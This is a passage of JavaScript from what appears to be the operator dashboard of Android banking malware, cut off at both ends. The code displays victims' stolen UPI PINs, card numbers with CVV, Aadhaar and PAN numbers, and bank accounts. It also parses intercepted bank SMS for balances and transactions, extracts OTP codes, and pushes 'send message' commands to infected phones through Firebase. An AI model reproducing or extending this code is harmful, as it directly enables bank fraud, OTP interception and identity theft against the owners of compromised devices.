  const body = document.getElementById('drawerBody');

  document.getElementById('drawerTitle').textContent = device.modelName || deviceId.substring(0, 16);

  let html = '';

  const isOnline = device.status === true;
  html += `
    <div style="display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap;">
      <span class="badge ${isOnline ? 'green' : 'red'}">${isOnline ? '● Online' : '○ Offline'}</span>
      ${device._schemaB ? '<span class="badge cyan">New Schema</span>' : ''}
      ${device._schemaC ? '<span class="badge purple">Panel-9</span>' : ''}
      ${device.checked ? '<span class="badge cyan">✓ Checked</span>' : ''}
      ${device.isRoot ? '<span class="badge purple">Rooted</span>' : ''}
      ${device.money ? `<span class="badge amber">💰 ${escapeHtml(device.money)}</span>` : ''}
    </div>`;

  html += `<div class="drawer-section">
    <div class="drawer-section-title">Device Info</div>
    <div class="drawer-fields">`;

  if (device._schemaB) {
    // Schema B: render from _raw
    const raw = device._raw || {};
    const infoFields = [
      ['Model', raw.d_name],
      ['Device ID', deviceId],
      ['Android', device.androidV],
      ['Battery', raw.battery != null ? raw.battery + '%' : null],
      ['Phone', raw.phoneNumber],
      ['SIM 1', raw.nameSim1 !== 'No SIM Found' ? `${raw.nameSim1 || ''} ${raw.numberSim1 || ''}`.trim() : null],
      ['SIM 2', raw.nameSim2 !== 'No SIM Found' ? `${raw.nameSim2 || ''} ${raw.numberSim2 || ''}`.trim() : null],
      ['Status', raw.status],
      ['Last Seen', raw.TimeandDate],
      ['Installed', raw.installTime],
      ['New User', raw.new_user],
    ];
    infoFields.forEach(([lbl, val]) => {
      if (val != null && val !== '') {
        html += `<div class="drawer-field">
          <div class="drawer-field-lbl">${lbl}</div>
          <div class="drawer-field-val">${escapeHtml(String(val))}</div>
        </div>`;
      }
    });
  } else {
    // Schema A / C: render core normalized fields + raw extras
    const coreFields = ['modelName', 'androidV', 'sdkV', 'cpu_arch', 'battery', 'storage', 'ip_address', 'service_provider', 'joined'];
    // Always show deviceId first
    html += `<div class="drawer-field">
      <div class="drawer-field-lbl">Device ID</div>
      <div class="drawer-field-val mono">${escapeHtml(deviceId)}</div>
    </div>`;
    coreFields.forEach(key => {
      if (device[key] !== undefined && device[key] !== '') {
        html += `<div class="drawer-field">
          <div class="drawer-field-lbl">${formatKey(key)}</div>
          <div class="drawer-field-val ${['ip_address'].includes(key) ? 'mono' : ''}">${escapeHtml(String(device[key]))}</div>
        </div>`;
      }
    });
    // Panel-9 extras (from raw): note, enote, upipin, like
    const raw = device._raw || {};
    const extraFields = [
      ['Note', raw.note],
      ['Extra Note', raw.enote],
      ['UPI PIN', raw.upipin],
      ['Liked', raw.like === true ? 'Yes' : null],
    ];
    extraFields.forEach(([lbl, val]) => {
      if (val != null && val !== '') {
        html += `<div class="drawer-field">
          <div class="drawer-field-lbl">${lbl}</div>
          <div class="drawer-field-val">${escapeHtml(String(val))}</div>
        </div>`;
      }
    });
  }
  html += `</div></div>`;

  // Phone number (Schema A)
  if (!device._schemaB) {
    const phoneDisplay = device.mobNo || (Array.isArray(device.sims) ? device.sims[0]?.phoneNumber : null) || '';
    if (phoneDisplay) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">Phone Number</div>
        <div class="drawer-field full">
          <div class="drawer-field-val mono" style="font-size:1rem;color:var(--cyan)">${escapeHtml(phoneDisplay)}</div>
        </div>
      </div>`;
    }
  }

  // SIMs (both schemas)
  if (Array.isArray(device.sims) && device.sims.length > 0) {
    html += `<div class="drawer-section">
      <div class="drawer-section-title">SIM Cards</div>
      <div class="sim-list">
        ${device.sims.map((sim, i) => `
          <div class="sim-item">
            <div class="sim-slot">${sim.simSlotIndex !== undefined ? sim.simSlotIndex : i}</div>
            <div>
              <div class="sim-carrier">${escapeHtml(sim.carrierName || 'Unknown')}</div>
              <div class="sim-number">${escapeHtml(sim.phoneNumber || 'Unknown')}</div>
            </div>
          </div>
        `).join('')}
      </div>
    </div>`;
  }

  // Schema B Extras: Login Info, Card, Account
  if (device._schemaB) {
    const loginData  = state.schemaB.login?.[deviceId];
    const cardData   = state.schemaB.Card?.[deviceId];
    const acctData   = state.schemaB.account?.[deviceId];

    if (loginData) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">User Login Data</div>
        <div class="drawer-fields">`;
      [['Name', loginData.name], ['Phone', loginData.number], ['PAN', loginData.pan],
       ['Aadhaar', loginData.adhar], ['DOB', loginData.dob]].forEach(([l, v]) => {
        if (v) html += `<div class="drawer-field"><div class="drawer-field-lbl">${l}</div><div class="drawer-field-val">${escapeHtml(v)}</div></div>`;
      });
      html += `</div></div>`;
    }

    if (acctData) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">Bank Account</div>
        <div class="drawer-fields">`;
      [['Account No.', acctData.account_number], ['User ID', acctData.user_id], ['Name', acctData.user_name]].forEach(([l, v]) => {
        if (v) html += `<div class="drawer-field"><div class="drawer-field-lbl">${l}</div><div class="drawer-field-val mono">${escapeHtml(v)}</div></div>`;
      });
      html += `</div></div>`;
    }

    if (cardData) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">Card Info</div>
        <div class="drawer-fields">`;
      [['Number', cardData.number], ['Exp', cardData.exp], ['CVV', cardData.cvv]].forEach(([l, v]) => {
        if (v) html += `<div class="drawer-field"><div class="drawer-field-lbl">${l}</div><div class="drawer-field-val mono">${escapeHtml(v)}</div></div>`;
      });
      html += `</div></div>`;
    }
  }

  // Schema A: webhookEvent, notes, upipin extras
  if (!device._schemaB) {
    if (device.webhookEvent) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">Webhook Events</div>
        <div class="drawer-fields">`;
      Object.entries(device.webhookEvent).forEach(([key, val]) => {
        html += `<div class="drawer-field full">
          <div class="drawer-field-lbl">${formatKey(key)}</div>
          <div class="drawer-field-val mono">${escapeHtml(JSON.stringify(val))}</div>
        </div>`;
      });
      html += `</div></div>`;
    }
    if (device.upipin) {
      html += `<div class="drawer-section">
        <div class="drawer-section-title">UPI Info</div>
        <div class="drawer-field">
          <div class="drawer-field-lbl">UPI PIN</div>
          <div class="drawer-field-val mono" style="color:var(--orange)">${escapeHtml(device.upipin)}</div>
        </div>
      </div>`;
    }
  }

  // Actions
  html += `<div class="drawer-section">
    <div class="drawer-section-title">Actions</div>
    <div class="drawer-actions">
      <button class="btn-primary btn-sm" onclick="copyDeviceId('${deviceId}')">📋 Copy ID</button>
      <button class="btn-primary btn-sm" onclick="copyForBizzuModz('${deviceId}')" style="background:var(--cyan,#06b6d4)">📱 Copy for BizzuModZ</button>
      <button class="btn-primary btn-sm" onclick="openSendSmsFromDrawer('${deviceId}')">💬 Send SMS</button>
      <button class="btn-secondary btn-sm" onclick="sendPing('${deviceId}')">📡 Ping</button>
      <button class="btn-secondary btn-sm" onclick="viewDeviceSms('${deviceId}')">📨 View SMS</button>
    </div>
  </div>`;

  // Bank SMS Intelligence section
  const bankData = state.deviceBankData[deviceId];
  if (bankData && bankData.bankSmsCount > 0) {
    html += `<div class="drawer-section">
      <div class="drawer-section-title" style="color:var(--green)">🏦 Bank SMS Intelligence</div>
      <div class="drawer-bank-auto-detect">Auto-detected from ${bankData.bankSmsCount} SMS</div>
      <div class="drawer-bank-count">${bankData.bankSmsCount} bank message(s) found</div>
      <div class="bank-hero-card" style="margin-bottom:12px">
        <div class="bank-hero-label">LATEST BALANCE · ${escapeHtml((bankData.bankName || 'BANK').toUpperCase())}</div>
        <div class="bank-hero-balance">${bankData.latestBalance !== null ? formatCurrency(bankData.latestBalance) : '—'}</div>
        ${bankData.latestBalanceTime ? `<div style="font-size:0.7rem;color:var(--text3);margin-top:6px">${escapeHtml(bankData.latestBalanceTime)}</div>` : ''}
      </div>
      ${bankData.lastTxn ? `<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px">
        <span class="bank-txn-tag ${bankData.lastTxn.isCredit ? 'credit' : 'debit'}" style="font-size:0.78rem;padding:6px 12px">
          <span class="txn-arrow">${bankData.lastTxn.isCredit ? '↗' : '↘'}</span>
          Last Txn: ${bankData.lastTxn.isCredit ? '+' : '-'}${formatCurrency(bankData.lastTxn.amount)}
        </span>
      </div>` : ''}
      ${bankData.bankSender ? `<div style="margin-bottom:8px"><span class="bank-name-tag" style="font-size:0.75rem;padding:5px 10px"><span class="tag-icon">₹</span> ${escapeHtml(bankData.bankSender)}</span></div>` : ''}
      ${bankData.account ? `<div><span class="card-info-tag" style="font-size:0.75rem;padding:5px 10px"><span class="card-icon">💳</span> A/C ••${escapeHtml(bankData.account)}</span></div>` : ''}
    </div>`;
  }

  // API endpoints hidden — not needed in UI

  body.innerHTML = html;
  drawer.classList.add('open');
  overlay.classList.add('open');
}

function closeDrawer() {
  document.getElementById('detailDrawer').classList.remove('open');
  document.getElementById('drawerOverlay').classList.remove('open');
}

// ── Bank SMS Parser ──

function parseBankSms(message) {
  if (!message) return null;

  const amounts = [];
  let match;
  const amountRegex = new RegExp(AMOUNT_REGEX.source, 'gi');
  while ((match = amountRegex.exec(message)) !== null) {
    amounts.push(parseFloat(match[1].replace(/,/g, '')));
  }
  // Also extract amounts after "debited by" / "credited for" without Rs prefix
  const bareAmountMatch = message.match(/(?:debited|credited)\s+(?:by|for|with)\s+([\d,]+(?:\.\d{1,2})?)/i);
  if (bareAmountMatch && amounts.length === 0) {
    amounts.push(parseFloat(bareAmountMatch[1].replace(/,/g, '')));
  }

  const isCredit = CREDIT_KEYWORDS.test(message);
  const isDebit = DEBIT_KEYWORDS.test(message);

  const balanceMatch = message.match(BALANCE_REGEX);
  const balance = balanceMatch ? parseFloat(balanceMatch[1].replace(/,/g, '')) : null;

  const accountMatch = message.match(ACCOUNT_REGEX);
  const account = accountMatch ? accountMatch[1] : null;

  // MUST have at least one banking indicator — otherwise it's not a bank SMS
  if (!isCredit && !isDebit && balance === null && amounts.length === 0) {
    return null; // Not a bank SMS
  }

  // Transaction amount is usually the first amount (not the balance)
  let txnAmount = null;
  if (amounts.length > 0) {
    if (balance && amounts.length > 1) {
      txnAmount = amounts.find(a => a !== balance) || amounts[0];
    } else if (!balance) {
      txnAmount = amounts[0];
    } else {
      txnAmount = amounts[0] !== balance ? amounts[0] : null;
    }
  }

  return {
    isBank: true,
    isCredit,
    isDebit,
    txnAmount,
    balance,
    account,
    type: isCredit ? 'credit' : isDebit ? 'debit' : 'info'
  };
}

function isBankSms(sender, message) {
  // CONTENT-FIRST: check if the message itself contains banking keywords
  if (!message) return false;
  // Must have banking content keywords AND at least one amount
  const hasAmount = /(?:Rs\.?|INR|₹)\s*[\d,]+/i.test(message) ||
                    /(?:debited|credited)\s+(?:by|for|with)\s+[\d,]+/i.test(message);
  if (!hasAmount) return false;
  // Must have banking keywords
  return BANK_CONTENT_REGEX.test(message);
}

function formatCurrency(amount) {
  if (amount === null || amount === undefined) return '';
  return '₹' + amount.toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function isOtpSms(msg) {
  return OTP_PATTERN.test(msg.message || '') || OTP_PATTERN.test(msg.sender || '');
}

// Compute bank data for a device from its SMS — called after SMS loads
function computeDeviceBankData(deviceId) {
  const msgs = state.messages[deviceId];
  if (!msgs) return;

  let latestBalance = null;
  let latestBalanceTime = '';
  let lastTxn = null;
  let bankName = '';
  let account = '';
  let bankSmsCount = 0;
  let lastBankSender = '';
  const cards = {}; // { '9862': { last4: '9862', sms: [...], lastTxn: {...} } }

  // Sort messages by ID (chronological)
  const sorted = Object.entries(msgs)
    .map(([key, msg]) => ({ id: key, ...msg }))
    .sort((a, b) => {
      const aId = parseInt(a.id); const bId = parseInt(b.id);
      if (!isNaN(aId) && !isNaN(bId)) return aId - bId;
      return 0;
    });

  sorted.forEach(msg => {
    const body = msg.message || '';

    // Card detection — look for "card ending XXXX" or "card no XXXX" patterns
    const cardMatch = body.match(/card\s*(?:ending|no\.?|number)\s*(\d{4})/i) ||
                      body.match(/on\s+card\s+(\d{4})/i) ||
                      body.match(/\*+\s*(\d{4})\b/);
    if (cardMatch) {
      const last4 = cardMatch[1];
      if (!cards[last4]) {
        cards[last4] = { last4, sms: [], lastTxn: null };
      }
      // Extract amount from card SMS
      const amtMatch = body.match(/(?:INR|Rs\.?)\s*([\d,]+\.?\d*)/i);
      const otpMatch = body.match(/(\d{4,8})\s*is\s*(?:OTP|otp|the\s*OTP)/i) ||
                        body.match(/OTP\s*(?:is|:)\s*(\d{4,8})/i);
      cards[last4].sms.push({
        message: body,
        sender: msg.sender || '',
        dateTime: msg.dateTime || '',
        amount: amtMatch ? amtMatch[1] : null,
        otp: otpMatch ? otpMatch[1] : null,
      });
      cards[last4].lastTxn = {
        amount: amtMatch ? parseFloat(amtMatch[1].replace(/,/g, '')) : null,
        message: body.substring(0, 80),
        otp: otpMatch ? otpMatch[1] : null,
      };
    }

    if (isBankSms(msg.sender, body)) {
      bankSmsCount++;
      lastBankSender = msg.sender || '';
      const parsed = parseBankSms(body);
      if (parsed) {
        if (parsed.balance !== null) {
          latestBalance = parsed.balance;
          latestBalanceTime = msg.dateTime || '';
        }
        if (parsed.txnAmount) {
          lastTxn = {
            amount: parsed.txnAmount,
            type: parsed.type,
            isCredit: parsed.isCredit,
            isDebit: parsed.isDebit,
          };
        }
        if (parsed.account) account = parsed.account;
      }
    }
  });

  // Resolve bank name from sender code
  if (lastBankSender) {
    const senderClean = cleanSenderCode(lastBankSender);
    bankName = BANK_NAMES[senderClean] || BANK_NAMES[lastBankSender] || senderClean;
  }

  state.deviceBankData[deviceId] = {
    latestBalance,
    latestBalanceTime,
    lastTxn,
    bankName,
    bankSender: lastBankSender,
    account,
    bankSmsCount,
    cards: Object.values(cards),
  };
}

// ── SMS View (Redesigned) ──

function updateSmsDeviceList() {
  const deviceList = document.getElementById('smsDeviceList');
  if (!deviceList) return;

  // Show ALL devices that have messages in Firebase, plus those already loaded
  let entries = Object.entries(state.clients)
    .sort((a, b) => {
      // Online first, then by name
      const aOnline = a[1].status === true ? 1 : 0;
      const bOnline = b[1].status === true ? 1 : 0;
      if (aOnline !== bOnline) return bOnline - aOnline;
      return (a[1].modelName || '').localeCompare(b[1].modelName || '');
    });

  if (state.smsDeviceFilter === 'online') {
    entries = entries.filter(([, c]) => c.status === true);
  }

  document.getElementById('smsDeviceCount').textContent = `${entries.length}`;
  document.querySelectorAll('.sms-filter-chip').forEach(el => el.classList.remove('active'));
  document.querySelector(`.sms-filter-chip[data-sms-filter="${state.smsDeviceFilter}"]`)?.classList.add('active');

  deviceList.innerHTML = entries.map(([deviceId, client]) => {
    const isOnline = client.status === true;
    const phone = client.mobNo || (Array.isArray(client.sims) && client.sims[0]?.phoneNumber) || '—';
    const initial = (client.modelName || deviceId).charAt(0).toUpperCase();
    const isActive = state.currentSmsDevice === deviceId;
    const loadedMsgs = state.messages[deviceId];
    const msgCount = loadedMsgs ? Object.keys(loadedMsgs).length : '…';

    return `
      <div class="sms-device-item ${isActive ? 'active' : ''}" onclick="selectSmsDevice('${deviceId}')">
        <div class="sms-device-avatar" style="${isOnline ? 'box-shadow: 0 0 8px var(--accent-green); border: 2px solid var(--accent-green);' : ''}">${initial}</div>
        <div class="sms-device-info">
          <div class="sms-device-name">${isOnline ? '<span style="color:var(--accent-green)">●</span> ' : ''}${escapeHtml(client.modelName || deviceId.substring(0, 12))}</div>
          <div class="sms-device-count">${phone} · ${msgCount} msgs</div>
        </div>
      </div>`;
  }).join('');

  if (state.currentSmsDevice) {
    renderSmsConversation(state.currentSmsDevice);
  }
}

function updateSmsView() {
  updateSmsDeviceList();
}

function toggleSmsSidebar() {
  const sidebar = document.querySelector('.sms-sidebar');
  const btn = document.getElementById('sidebarToggleBtn');
  if (!sidebar) return;
  sidebar.classList.toggle('collapsed');
  const isCollapsed = sidebar.classList.contains('collapsed');
  if (btn) btn.textContent = isCollapsed ? '▼' : '▲';
}

function setSmsDeviceFilter(filter) {
  state.smsDeviceFilter = filter;
  updateSmsDeviceList();
}

function selectSmsDevice(deviceId) {
  state.currentSmsDevice = deviceId;
  // LAZY: Load SMS for this device only when selected
  loadDeviceSms(deviceId);
  updateSmsDeviceList();

  // If messages are already loaded, render immediately
  if (state.messages[deviceId]) {
    renderSmsConversation(deviceId);
  } else {
    // Show loading state
    const convBody = document.getElementById('smsConvBody');
    convBody.innerHTML = '<div class="sms-loading"><div class="spinner"></div><span>Loading messages...</span></div>';
  }
}

function setSmsTab(tab) {
  state.smsTab = tab;
  // Each tab has its own render cache (deviceId_tabName), so no cleanup needed
  document.querySelectorAll('.sms-tab').forEach(el => el.classList.remove('active'));
  document.querySelector(`.sms-tab[data-tab="${tab}"]`)?.classList.add('active');
  if (state.currentSmsDevice) renderSmsConversation(state.currentSmsDevice);
}

function setSmsSearch(query) {
  state.smsSearch = query;
  if (state.currentSmsDevice) renderSmsConversation(state.currentSmsDevice);
}

function renderSmsConversation(deviceId) {
  const convHeader = document.getElementById('smsConvHeader');
  const convBody = document.getElementById('smsConvBody');
  const composeArea = document.getElementById('smsComposeArea');
  const bankSummary = document.getElementById('bankSummaryArea');
  const toolbar = document.getElementById('smsToolbar');

  const client = state.clients[deviceId] || {};
  const msgs = state.messages[deviceId] || {};
  const initial = (client.modelName || deviceId).charAt(0).toUpperCase();

  // Header with auto-forward toggle
  const isAutoFwd = state._autoForwardDevices && state._autoForwardDevices[deviceId];
  // Only update header on device switch (not on every SMS update — prevents blink)
  if (state._lastRenderedDevice !== deviceId || !convHeader.innerHTML.trim()) {
    convHeader.innerHTML = `
      <div class="sms-conv-device-info">
        <div class="sms-conv-avatar">${initial}</div>
        <div class="sms-conv-details">
          <div class="sms-conv-name">${escapeHtml(client.modelName || deviceId.substring(0,16))}</div>
          <div class="sms-conv-sub">${escapeHtml(getPhoneDisplay(client))} · <span class="badge ${client.status ? 'green' : 'gray'}" style="font-size:0.65rem">${client.status ? 'Online' : 'Offline'}</span></div>
        </div>
        <div class="sms-conv-actions">
          <button class="btn-secondary btn-sm" onclick="toggleAutoForward('${deviceId}')" style="${isAutoFwd ? 'color:var(--green);border-color:var(--green)' : ''}">
            ${isAutoFwd ? '⚡ Auto-Fwd ON' : '○ Auto-Fwd OFF'}
          </button>
        </div>
      </div>`;
  }

  // Sort messages — ASCENDING (oldest first, latest at bottom like chat)
  // Parse dateTime like "24-06-2026 | 07:27 am" or "24-06-2026 07:27 pm"
  function parseSmsDate(dt) {
    if (!dt) return 0;
    const m = dt.match(/(\d{1,2})-(\d{1,2})-(\d{4})\s*\|?\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
    if (!m) return 0;
    let [, d, mo, y, h, min, ampm] = m;
    h = parseInt(h); min = parseInt(min);
    if (ampm && ampm.toLowerCase() === 'pm' && h < 12) h += 12;
    if (ampm && ampm.toLowerCase() === 'am' && h === 12) h = 0;
    return new Date(parseInt(y), parseInt(mo) - 1, parseInt(d), h, min).getTime();
  }

  let sortedMsgs = Object.entries(msgs)
    .map(([key, msg]) => ({ id: key, ...msg }))
    .sort((a, b) => {
      // Try numeric ID sort first
      const aId = parseInt(a.id);
      const bId = parseInt(b.id);
      if (!isNaN(aId) && !isNaN(bId)) return aId - bId;
      // Fallback: sort by dateTime
      const aTime = parseSmsDate(a.dateTime || a.date);
      const bTime = parseSmsDate(b.dateTime || b.date);
      if (aTime && bTime) return aTime - bTime;
      // Last fallback: string comparison
      return (a.id || '').localeCompare(b.id || '');
    });

  // Apply search filter
  if (state.smsSearch) {
    const q = state.smsSearch.toLowerCase();
    sortedMsgs = sortedMsgs.filter(m =>
      (m.message || '').toLowerCase().includes(q) ||
      (m.sender || '').toLowerCase().includes(q)
    );
  }

  // Parse bank info for all messages
  const bankMsgs = [];
  let latestBalance = null;
  let latestBalanceTime = '';

  sortedMsgs.forEach(msg => {
    if (isBankSms(msg.sender, msg.message)) {
      const parsed = parseBankSms(msg.message);
      if (parsed) {
        msg._bank = parsed;
        bankMsgs.push(msg);
        if (parsed.balance !== null) {
          latestBalance = parsed.balance;
          latestBalanceTime = msg.dateTime || '';
        }
      }
    }
  });

  // Filter by tab
  let displayMsgs = sortedMsgs;
  if (state.smsTab === 'bank') {
    displayMsgs = bankMsgs;
  } else if (state.smsTab === 'otp') {
    displayMsgs = sortedMsgs.filter(m => isOtpSms(m));
  } else if (state.smsTab === 'sent') {
    displayMsgs = sortedMsgs.filter(m => m.type === 'outgoing');
  }

  // Bank summary card — only re-render when values change (prevents blink)
  if (bankSummary) {
    if (bankMsgs.length > 0) {
      const totalCredits = bankMsgs.filter(m => m._bank?.isCredit && m._bank?.txnAmount).reduce((s, m) => s + m._bank.txnAmount, 0);
      const totalDebits = bankMsgs.filter(m => m._bank?.isDebit && m._bank?.txnAmount).reduce((s, m) => s + m._bank.txnAmount, 0);
      const bankData = state.deviceBankData[deviceId] || {};
      const bankLabel = bankData.bankName || 'Bank';
      const bankHash = `${bankLabel}_${latestBalance}_${totalCredits}_${totalDebits}_${bankMsgs.length}`;

      if (state._lastBankHash !== bankHash) {
        state._lastBankHash = bankHash;
        bankSummary.style.display = 'flex';
        bankSummary.innerHTML = `
          <div class="bsm-balance-card">
            <div class="bsm-balance-label">${escapeHtml(bankLabel.toUpperCase())}</div>
            <div class="bsm-balance-amount">${latestBalance !== null ? formatCurrency(latestBalance) : '—'}</div>
            ${bankData.account ? `<div class="bsm-account">••${escapeHtml(bankData.account)}</div>` : ''}
          </div>
          <div class="bsm-stats">
            <div class="bsm-stat">
              <div class="bsm-stat-icon credit">↗</div>
              <div>
                <div class="bsm-stat-value credit">${formatCurrency(totalCredits)}</div>
              </div>
            </div>
            <div class="bsm-stat">
              <div class="bsm-stat-icon debit">↘</div>
              <div>
                <div class="bsm-stat-value debit">${formatCurrency(totalDebits)}</div>
              </div>
            </div>
            <div class="bsm-stat">
              <div class="bsm-stat-icon count">📊</div>
              <div>
                <div class="bsm-stat-value">${bankMsgs.length}</div>
              </div>
            </div>
          </div>`;
      }
    } else {
      bankSummary.style.display = 'none';
    }
  }

  // Silent refresh: append only new messages (works for ALL tabs)
  const currentMsgIds = new Set(displayMsgs.map(m => m.id));
  const prevIds = state._lastRenderedMsgIds[deviceId + '_' + (state.smsTab || 'all')];
  const isDeviceSwitch = state._lastRenderedDevice !== deviceId;
  if (isDeviceSwitch) {
    state._lastRenderedDevice = deviceId;
    state._deviceSwitchTime = Date.now();
  }
  const recentSwitch = state._deviceSwitchTime && (Date.now() - state._deviceSwitchTime) < 2000;
  const isTabChange = !prevIds || isDeviceSwitch || recentSwitch;
  const wasAtBottom = convBody.scrollTop + convBody.clientHeight >= convBody.scrollHeight - 50;

  if (!isTabChange && prevIds) {
    // Find new messages that weren't in the previous render
    const newMsgs = displayMsgs.filter(m => !prevIds.has(m.id));
    // Also check for removed messages
    const removedIds = [...prevIds].filter(id => !currentMsgIds.has(id));

    if (newMsgs.length > 0 && removedIds.length === 0 && newMsgs.length < displayMsgs.length) {
      // Pure append — no DOM wipe needed
      const frag = document.createDocumentFragment();
      newMsgs.forEach(msg => {
        const isBank = msg._bank;
        const isOutgoing = msg.type === 'outgoing';
        const isOtp = isOtpSms(msg);
        const tmp = document.createElement('div');
        tmp.innerHTML = isBank ? renderBankSmsCard(msg, msg._bank) : renderSmsCard(msg, isOutgoing, isOtp);
        while (tmp.firstChild) frag.appendChild(tmp.firstChild);
      });
      convBody.appendChild(frag);

      if (wasAtBottom) {
        convBody.scrollTop = convBody.scrollHeight;
      }
      state._lastRenderedMsgIds[deviceId + '_' + (state.smsTab || 'all')] = currentMsgIds;

      if (toolbar) toolbar.style.display = 'flex';
      if (composeArea) composeArea.style.display = 'block';
      return; // Skip full re-render — zero blink!
    }

    if (newMsgs.length === 0 && removedIds.length === 0) {
      // Nothing changed — skip entirely
      return;
    }
  }

  // Full render (first load, tab switch, or structural change)
  // Use zero-blink swap: build offscreen, swap in one frame
  state._lastRenderedMsgIds[deviceId + '_' + (state.smsTab || 'all')] = currentMsgIds;

  if (displayMsgs.length === 0) {
    const emptyMsg = state.smsTab === 'bank' ? 'No bank SMS found for this device' :
      state.smsTab === 'otp' ? 'No OTP messages found' :
      state.smsTab === 'sent' ? 'No outgoing messages found' :
        state.smsSearch ? 'No messages match your search' : 'No messages for this device';
    convBody.innerHTML = `<div class="sms-empty">${emptyMsg}</div>`;
  } else {
    const scrollPos = convBody.scrollTop;
    // Build new content in a fragment (offscreen, no blink)
    const frag = document.createDocumentFragment();
    const html = displayMsgs.map(msg => {
      const isBank = msg._bank;
      const isOutgoing = msg.type === 'outgoing';
      const isOtp = isOtpSms(msg);
      if (isBank) return renderBankSmsCard(msg, msg._bank);
      return renderSmsCard(msg, isOutgoing, isOtp);
    }).join('');

    // Swap in a single animation frame — prevents white flash
    requestAnimationFrame(() => {
      convBody.innerHTML = html;
      if (isTabChange) {
        convBody.scrollTop = convBody.scrollHeight;
        const lastChild = convBody.lastElementChild;
        if (lastChild) lastChild.scrollIntoView({ block: 'end' });
      } else {
        convBody.scrollTop = scrollPos;
      }
    });
  }

  // Show toolbar and compose
  if (toolbar) toolbar.style.display = 'flex';
  const sims = client.sims || [];
  const simSelect = document.getElementById('smsSimSelect');
  if (simSelect) {
    simSelect.innerHTML = sims.map((sim, i) => {
      const num = sim.phoneNumber && sim.phoneNumber !== 'Unknown' ? ` (${sim.phoneNumber})` : '';
      return `<option value="${i}">SIM ${parseInt(sim.simSlotIndex || i) + 1}: ${sim.carrierName || 'Unknown'}${num}</option>`;
    }).join('') || '<option value="0">Default SIM</option>';
  }
  if (composeArea) composeArea.style.display = 'block';
}

// Regular SMS card renderer
function renderSmsCard(msg, isOutgoing, isOtp) {
  let bodyHtml = escapeHtml(msg.message || '');
  // Highlight OTP codes
  if (isOtp) {
    bodyHtml = bodyHtml.replace(/\b(\d{4,8})\b/g, '<span class="sms-otp-highlight">$1</span>');
  }
  return `
    <div class="sms-card ${isOutgoing ? 'outgoing' : 'incoming'}" data-msg-id="${msg.id}">
      <div class="sms-card-header">
        <span class="sms-card-sender">${escapeHtml(msg.sender || (isOutgoing ? '📤 Sent' : '📥 Unknown'))}</span>
        <span class="sms-card-time">${escapeHtml(msg.dateTime || '')}</span>
      </div>
      <div class="sms-card-body">${bodyHtml}</div>
    </div>`;
}

function renderBankSmsCard(msg, bank) {
  const typeClass = bank.isCredit ? 'credit' : bank.isDebit ? 'debit' : 'info';
  const typeLabel = bank.isCredit ? '↗ Credit' : bank.isDebit ? '↘ Debit' : 'Info';
  const typeColor = bank.isCredit ? 'var(--green)' : bank.isDebit ? 'var(--red)' : 'var(--amber)';
  const typeBg = bank.isCredit ? 'var(--green-bg)' : bank.isDebit ? 'var(--red-bg)' : 'var(--amber-bg)';

  // Resolve bank name from sender
  const senderClean = cleanSenderCode(msg.sender);
  const bankName = BANK_NAMES[senderClean] || BANK_NAMES[msg.sender] || senderClean || 'Bank';

  // Build bank info tags
  let bankTags = '';
  bankTags += `<span style="display:inline-flex;align-items:center;gap:3px;padding:2px 8px;border-radius:100px;font-size:0.7rem;font-weight:600;background:${typeBg};color:${typeColor};border:1px solid ${typeColor}20">${typeLabel}</span>`;
  if (bank.txnAmount) {
    const sign = bank.isDebit ? '-' : '+';
    bankTags += ` <span style="font-weight:700;font-size:0.82rem;color:${typeColor}">${sign}₹${bank.txnAmount.toLocaleString('en-IN', {minimumFractionDigits: 2})}</span>`;
  }
  if (bank.balance !== null) {
    bankTags += ` <span style="font-size:0.72rem;color:var(--text3)">Bal: <b style="color:var(--green)">₹${bank.balance.toLocaleString('en-IN', {minimumFractionDigits: 2})}</b></span>`;
  }
  if (bank.account) {
    bankTags += ` <span style="font-size:0.7rem;color:var(--text3)">💳 ••${escapeHtml(bank.account)}</span>`;
  }

  return `
    <div class="sms-card bank ${typeClass}" data-msg-id="${msg.id}" style="border-left: 3px solid ${typeColor}">
      <div class="sms-card-header">
        <span class="sms-card-sender bank-sender" style="color:${typeColor}">🏦 ${escapeHtml(bankName)}</span>
        <span class="sms-card-time">${escapeHtml(msg.dateTime || '')}</span>
      </div>
      <div style="padding:0 12px 6px;display:flex;flex-wrap:wrap;gap:6px;align-items:center">${bankTags}</div>
      <div class="sms-card-body">${highlightBankText(msg.message || '')}</div>
    </div>`;
}

function highlightBankText(text) {
  let html = escapeHtml(text);
  // Highlight amounts
  html = html.replace(/((?:Rs\.?|INR|₹)\s*[\d,]+(?:\.\d{1,2})?)/gi, '<span class="sms-highlight-amount">$1</span>');
  // Highlight credit/debit words
  html = html.replace(/(credited|received|deposited|refund|cashback)/gi, '<span class="sms-highlight-credit">$1</span>');
  html = html.replace(/(debited|withdrawn|paid|spent|deducted|purchase)/gi, '<span class="sms-highlight-debit">$1</span>');
  return html;
}

async function sendSms(deviceId, to, message, simSlot) {
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db || !deviceId) return;
  const schema = ctx.schemaType;

  try {
    if (schema === 'B') {
      // Schema B: write command directly into user_data/{deviceId}
      const cmdData = {
        command: 'send message',
        messageText: message,
        targetNumber: to,
        simSlot: String(parseInt(simSlot) || 0),
        targetDeviceId: deviceId,
        _t: Date.now()
      };
      await ctx.db.ref(`user_data/${deviceId}`).update(cmdData);
      showToast('SMS command sent! (Schema B)', 'success');
    } else if (schema === 'D') {
      // Schema D: write to /sendsms/{deviceId}
      const smsData = {
        to: to,
        message: message,
        sim: parseInt(simSlot) || 0,
        status: 'pending',
        _t: Date.now()
      };
      await ctx.db.ref(`sendsms/${deviceId}`).set(smsData);
      showToast('SMS command sent! (Schema D)', 'success');
    } else {
      // Schema A/C: write to /commands/{deviceId}/sendSms + /clients/{deviceId}/webhookEvent/sendSms
      const smsData = {
        to: to,
        message: message,
        from: parseInt(simSlot) || 0,
        isSended: false,
        _t: Date.now()
      };
      await Promise.all([
        ctx.db.ref(`commands/${deviceId}/sendSms`).set(smsData),
